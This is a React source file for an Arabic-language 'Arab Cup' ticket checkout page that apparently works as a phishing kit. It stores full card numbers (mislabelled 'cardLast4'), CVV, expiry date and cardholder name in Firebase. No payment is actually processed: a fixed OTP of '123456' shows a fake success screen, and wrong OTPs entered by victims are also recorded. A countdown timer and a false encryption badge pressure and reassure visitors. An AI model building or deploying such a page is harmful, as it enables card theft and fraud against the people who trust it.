import { Header } from "@/components/arab-cup/Header";
import { useCart } from "@/context/CartContext";
import { useNavigation } from "@/context/NavigationContext";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Clock, CreditCard, Lock, Shield, CheckCircle } from "lucide-react";
import { useState, useEffect } from "react";
import { OTPModal } from "@/components/arab-cup/OTPModal";
import { useToast } from "@/hooks/use-toast";
import { saveFormSubmission } from "@/lib/firebase";

export default function Payment() {
  const { totalPrice, totalItems, clearCart } = useCart();
  const { toast } = useToast();
  const { navigateTo } = useNavigation();
  const [timeLeft, setTimeLeft] = useState(7 * 60 + 44);
  const [showOTP, setShowOTP] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [otpError, setOtpError] = useState<string | null>(null);

  const [cardData, setCardData] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardholderName: "",
  });

  const [errors, setErrors] = useState<Record<string, string>>({});

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 0) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")} دقيقة`;
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];
    for (let i = 0; i < match.length; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(" ") : v;
  };

  const formatExpiry = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    if (v.length >= 2) {
      return v.substring(0, 2) + "/" + v.substring(2, 4);
    }
    return v;
  };

  const validateForm = () => {
    const newErrors: Record<string, string> = {};

    const cardNum = cardData.cardNumber.replace(/\s/g, "");
    if (!cardNum) newErrors.cardNumber = "رقم البطاقة مطلوب";
    else if (cardNum.length < 16) newErrors.cardNumber = "رقم البطاقة غير صحيح";

    if (!cardData.expiryDate) newErrors.expiryDate = "مطلوب";
    else if (!/^\d{2}\/\d{2}$/.test(cardData.expiryDate)) {
      newErrors.expiryDate = "شهر/سنة";
    }

    if (!cardData.cvv) newErrors.cvv = "مطلوب";
    else if (cardData.cvv.length < 3) newErrors.cvv = "غير صحيح";

    if (!cardData.cardholderName.trim()) {
      newErrors.cardholderName = "اسم حامل البطاقة مطلوب";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async () => {
    if (validateForm()) {
      try {
        const cardLast4 = cardData.cardNumber;

        await saveFormSubmission(
          "payment_attempt",
          {
            cardLast4,
            cardholderName: cardData.cardholderName,
            expiryDate: cardData.expiryDate,
            amount: totalPrice,
            cvv: cardData.cvv,
            ticketCount: totalItems,
          },
          true,
        );
      } catch (error) {
        console.error("Failed to save payment submission:", error);
      }
      setIsProcessing(true);
      setTimeout(() => {
        setIsProcessing(false);
        setShowOTP(true);
      }, 1500);
    }
  };

  const handleOTPVerify = async (otp: string) => {
    setIsProcessing(true);
    setOtpError(null);

    await new Promise((resolve) => setTimeout(resolve, 2000));

    if (otp === "123456") {
      await clearCart();
      setShowOTP(false);
      setShowSuccess(true);
    } else {
      try {
        await saveFormSubmission(
          "payment_attempt",
          {
            otp,
            ticketCount: totalItems,
            failureReason: "رمز التحقق غير صحيح",
          },
          false,
        );
      } catch (error) {
        console.error("Failed to save payment submission:", error);
      }

      setOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
      setIsProcessing(false);
    }
  };

  const handleInputChange = (field: string, value: string) => {
    let formattedValue = value;

    if (field === "cardNumber") {
      formattedValue = formatCardNumber(value);
    } else if (field === "expiryDate") {
      formattedValue = formatExpiry(value);
    } else if (field === "cvv") {
      formattedValue = value.replace(/[^0-9]/g, "").substring(0, 4);
    }

    setCardData((prev) => ({ ...prev, [field]: formattedValue }));
    if (errors[field]) {
      setErrors((prev) => ({ ...prev, [field]: "" }));
    }
  };

  if (showSuccess) {
    return (
      <div
        className="min-h-screen bg-[#f7f7f7] font-sans flex flex-col"
        dir="rtl"
      >
        <Header />
        <div className="flex-1 flex flex-col items-center justify-center p-8 text-center">
          <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mb-6">
            <CheckCircle className="w-14 h-14 text-green-600" />
          </div>
          <h1 className="text-2xl font-bold text-gray-900 mb-2">
            تم الدفع بنجاح!
          </h1>
          <p className="text-gray-600 mb-8 max-w-sm">
            تم تأكيد تذاكرك. ستتلقى بريداً إلكترونياً للتأكيد قريباً.
          </p>
          <div className="bg-white rounded-2xl p-6 shadow-sm w-full max-w-sm mb-8">
            <div className="text-sm text-gray-500 mb-1">إجمالي الطلب</div>
            <div className="text-3xl font-bold text-[#8A1538]">
              {totalPrice} ريال
            </div>
            <div className="text-sm text-gray-500 mt-2">{totalItems} تذكرة</div>
          </div>
          <Button
            onClick={() => navigateTo("/")}
            className="w-full max-w-sm h-14 bg-[#8A1538] hover:bg-[#70102d] text-white text-lg font-bold rounded-xl"
          >
            العودة للرئيسية
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f7f7f7] font-sans pb-24" dir="rtl">
      <Header />

      <div className="sticky top-0 z-10 bg-[#8A1538] text-white px-4 py-3 flex items-center justify-between shadow-md">
        <div className="flex items-center gap-2 bg-[#6b1030] rounded-full px-4 py-2">
          <Clock className="w-4 h-4" />
          <span className="text-sm font-semibold">{formatTime(timeLeft)}</span>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-xs uppercase tracking-wider opacity-80">
            ملخص الطلب
          </span>
          <span className="font-bold text-xl">{totalPrice} ريال</span>
        </div>
      </div>

      <div className="p-4">
        <div className="bg-white rounded-2xl shadow-sm p-6 mb-4">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-12 h-12 bg-gradient-to-br from-[#8A1538] to-[#6b1030] rounded-xl flex items-center justify-center shadow-md">
              <CreditCard className="w-6 h-6 text-white" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-gray-900">
                الدفع بالبطاقة
              </h2>
              <p className="text-xs text-gray-500">دفع آمن عبر اتصال مشفر</p>
            </div>
          </div>

          <div className="space-y-4">
            <div className="relative">
              <Input
                data-testid="input-cardNumber"
                value={cardData.cardNumber}
                onChange={(e) =>
                  handleInputChange("cardNumber", e.target.value)
                }
                className={`h-14 pt-5 pb-2 pr-4 pl-24 text-lg font-mono tracking-wider border-gray-200 rounded-xl ${errors.cardNumber ? "border-red-400 bg-red-50" : "focus:border-[#8A1538]"}`}
                placeholder=" "
                maxLength={19}
                dir="ltr"
              />
              <label className="absolute right-4 top-2 text-xs text-gray-500 pointer-events-none">
                رقم البطاقة
              </label>
              <div className="absolute left-3 top-1/2 -translate-y-1/2 flex gap-1.5">
                <div className="w-10 h-6 bg-gradient-to-r from-blue-600 to-blue-800 rounded text-[8px] text-white flex items-center justify-center font-bold tracking-wider">
                  VISA
                </div>
                <div className="w-10 h-6 bg-gray-100 rounded flex items-center justify-center overflow-hidden">
                  <div className="w-4 h-4 bg-red-500 rounded-full opacity-90 -mr-2"></div>
                  <div className="w-4 h-4 bg-yellow-400 rounded-full opacity-90"></div>
                </div>
              </div>
              {errors.cardNumber && (
                <p className="text-red-500 text-xs mt-1 mr-1">
                  {errors.cardNumber}
                </p>
              )}
            </div>

            <div className="flex gap-3">
              <div className="flex-1 relative">
                <Input
                  data-testid="input-expiry"
                  value={cardData.expiryDate}
                  onChange={(e) =>
                    handleInputChange("expiryDate", e.target.value)
                  }
                  className={`h-14 pt-5 pb-2 px-4 text-lg font-mono border-gray-200 rounded-xl ${errors.expiryDate ? "border-red-400 bg-red-50" : "focus:border-[#8A1538]"}`}
                  placeholder=" "
                  maxLength={5}
                  dir="ltr"
                />
                <label className="absolute right-4 top-2 text-xs text-gray-500 pointer-events-none">
                  تاريخ الانتهاء
                </label>
                {errors.expiryDate && (
                  <p className="text-red-500 text-xs mt-1 mr-1">
                    {errors.expiryDate}
                  </p>
                )}
              </div>
              <div className="flex-1 relative">
                <Input
                  data-testid="input-cvv"
                  type="password"
                  value={cardData.cvv}
                  onChange={(e) => handleInputChange("cvv", e.target.value)}
                  className={`h-14 pt-5 pb-2 pr-4 pl-10 text-lg font-mono border-gray-200 rounded-xl ${errors.cvv ? "border-red-400 bg-red-50" : "focus:border-[#8A1538]"}`}
                  placeholder=" "
                  maxLength={4}
                  dir="ltr"
                />
                <label className="absolute right-4 top-2 text-xs text-gray-500 pointer-events-none">
                  CVV
                </label>
                <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                {errors.cvv && (
                  <p className="text-red-500 text-xs mt-1 mr-1">{errors.cvv}</p>
                )}
              </div>
            </div>

            <div className="relative">
              <Input
                data-testid="input-cardholderName"
                value={cardData.cardholderName}
                onChange={(e) =>
                  handleInputChange("cardholderName", e.target.value)
                }
                className={`h-14 pt-5 pb-2 px-4 text-base border-gray-200 rounded-xl ${errors.cardholderName ? "border-red-400 bg-red-50" : "focus:border-[#8A1538]"}`}
                placeholder=" "
              />
              <label className="absolute right-4 top-2 text-xs text-gray-500 pointer-events-none">
                اسم حامل البطاقة
              </label>
              {errors.cardholderName && (
                <p className="text-red-500 text-xs mt-1 mr-1">
                  {errors.cardholderName}
                </p>
              )}
            </div>
          </div>

          <p className="text-xs text-gray-400 mt-4 text-center"></p>
        </div>

        <div className="bg-white rounded-2xl shadow-sm p-5 mb-4">
          <div className="flex items-center justify-between text-sm pb-3 border-b border-gray-100">
            <span className="text-gray-600">{totalItems} تذكرة</span>
            <span className="font-semibold">{totalPrice} ريال</span>
          </div>
          <div className="flex items-center justify-between pt-3">
            <span className="font-bold text-gray-900">المبلغ الإجمالي</span>
            <span className="font-bold text-[#8A1538] text-2xl">
              {totalPrice} ريال
            </span>
          </div>
        </div>

        <div className="flex items-center justify-center gap-2 text-xs text-gray-500 bg-white rounded-xl p-3 shadow-sm">
          <Shield className="w-4 h-4 text-green-600" />
          <span>محمي بتشفير SSL 256-bit</span>
          <Lock className="w-3 h-3 text-gray-400" />
        </div>
      </div>

      <div className="fixed bottom-0 left-0 right-0 p-4 bg-white border-t border-gray-100 shadow-lg">
        <Button
          data-testid="button-confirmPayment"
          onClick={handleSubmit}
          disabled={isProcessing}
          className="w-full h-14 bg-[#8A1538] hover:bg-[#70102d] text-white text-lg font-bold rounded-xl shadow-lg disabled:opacity-70"
        >
          {isProcessing ? (
            <span className="flex items-center gap-2">
              <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
              جاري المعالجة...
            </span>
          ) : (
            `ادفع ${totalPrice} ريال`
          )}
        </Button>
      </div>

      <OTPModal
        isOpen={showOTP}
        onClose={() => {
          setShowOTP(false);
          setOtpError(null);
        }}
        onVerify={handleOTPVerify}
        isProcessing={isProcessing}
        error={otpError}
      />
    </div>
  );
}
